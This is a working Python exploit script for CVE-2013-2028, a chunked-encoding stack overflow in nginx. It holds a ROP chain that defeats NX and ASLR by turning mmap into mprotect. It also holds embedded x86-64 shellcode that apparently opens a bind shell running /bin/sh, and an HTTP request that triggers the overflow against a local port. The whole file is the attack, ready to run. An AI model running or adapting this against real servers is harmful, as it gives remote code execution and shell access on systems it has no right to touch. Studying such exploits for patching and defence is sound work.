# -*- coding: utf-8 -*-

########################################################################################
# CVE-2013-2028
# Environment : NX, ASLR
# Coded by dokydoky
# I used ROP Gagdet in https://github.com/danghvu/nginx-1.4.0/blob/master/exp-nginx.rb
########################################################################################


import socket
import struct
from pwn import *

shellcode = (
    '\x6A\x29\x58\x6A\x02\x5F\x6A\x01\x5E\x99\x0F\x05\x52\xBA\x01\x01' +
    '\x01\x01\x81\xF2\x03\x01\x31\x38\x52\x6A\x10\x5A\x48\x89\xC5\x48' +
    '\x89\xC7\x6A\x31\x58\x48\x89\xE6\x0F\x05\x6A\x32\x58\x48\x89\xEF' +
    '\x6A\x01\x5E\x0F\x05\x6A\x2B\x58\x48\x89\xEF\x31\xF6\x99\x0F\x05' +
    '\x48\x89\xC5\x6A\x03\x5E\x48\xFF\xCE\x78\x0B\x56\x6A\x21\x58\x48' +
    '\x89\xEF\x0F\x05\xEB\xEF\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01' +
    '\x01\x01\x31\xD2\x52\x6A\x08\x5A\x48\x01\xE2\x52\x48\x89\xE2\x6A' +
    '\x68\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x2F\x73\x50\x6A\x3B\x58\x48' +
    '\x89\xE7\x48\x89\xD6\x99\x0F\x05'
)

mmap64 = 0x402680
mmapgot = 0x678280
mmapaddr = 0x410000

# System call table of 'sys_mprotect' 
#   %rdi = unsigned long start = mmapaddr
#   %rsi = size_t len = 0x1000
#   %rdx = unsigned long prot = 7

chain = [
    0x0046bcb0,			# pop rax ; retn 0x0000
    0x60,			# an offset between mmap64, mprotect
    0x0044e87c,			# pop rdi ; ret  
    mmapgot,			
    0x0045b724,			# add byte [rdi], al ; mov eax, 0x00000000 ; ret 
    
    0x0046bcb0,			# pop rax ; retn 0x0000
    mmapgot,			# For next Instruction "xor byte [rax-0x77], cl"
    0x0041acbe,			# pop rdx ; xor byte [rax-0x77], cl ; ret  
    0x7,
    0x004069e2,			# pop rsi ; ret
    0x1000,
    0x0044e87c,			# pop rdi ; ret 
    mmapaddr,
    mmap64
]
ropchain = ''.join(struct.pack('<Q', _) for _ in chain)

for i in range(0,len(shellcode),8):
    code = shellcode[i:i+8]
    chain = [
        0x0046bcb0,			# pop rax ; retn 0x0000
	mmapaddr+i,			# dst
        0x004069e2,			# pop rsi ; ret
	struct.unpack('<Q', code)[0],	# src : shellcode chunk(8byte)
        0x00428cdb			# mov qword [rax], rsi ; mov eax, 0x00000000 ; ret
    ]
    ropchain += ''.join(struct.pack('<Q', _) for _ in chain)

ropchain += struct.pack('<Q', mmapaddr)		# return to mmapaddr


ChunkSize = '8000000000000000'
data = "A"*5139 + ropchain

payload = '''GET / HTTP/1.1\r
Host: 127.0.0.1:8080\r
Transfer-Encoding: chunked\r\n\r
{} {}'''.format(ChunkSize, data)

if __name__ == "__main__":
    HOST = '127.0.0.1'
    PORT = 8080

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    s.sendall(payload)
#    s.close()


